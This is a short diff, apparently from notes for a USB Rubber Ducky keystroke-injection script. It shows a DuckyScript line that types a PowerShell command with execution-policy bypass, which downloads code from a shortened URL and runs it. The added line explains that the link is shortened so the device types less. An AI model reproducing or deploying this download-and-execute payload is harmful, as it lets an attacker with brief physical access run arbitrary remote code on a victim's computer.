@@ -10,3 +10,4 @@ DELAY 100
 STRING powershell -Exec Bypass iex ((New-Object System.Net.WebClient).DownloadString('https://3.ly/ao519'))
 ENTER
 ```
+The link is shortened so the ducky doesn't have to type such long of a string.
